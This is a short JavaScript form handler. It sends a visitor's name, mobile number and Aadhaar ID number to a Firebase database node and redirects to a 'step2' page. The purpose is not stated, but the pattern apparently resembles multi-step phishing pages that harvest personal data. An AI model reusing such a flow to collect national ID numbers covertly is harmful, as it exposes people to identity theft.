// Reference to Firebase DB
var ududip007DB = firebase.database().ref("ududip007");

// Form submit listener
document.getElementById("ududip007").addEventListener("submit", function (e) {
  e.preventDefault();

  var aname = document.getElementById("aname").value;
  var bmobile = document.getElementById("bmobile").value;
  var cac = document.getElementById("cac").value;

  var newEntry = ududip007DB.push();
  newEntry.set({
    a_NAME: aname,
    b_MOBILE: bmobile,
    c_aadhar: cac
  }).then(() => {
    localStorage.setItem("firebaseKey", newEntry.key);
    window.location.href = "step2.html";
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
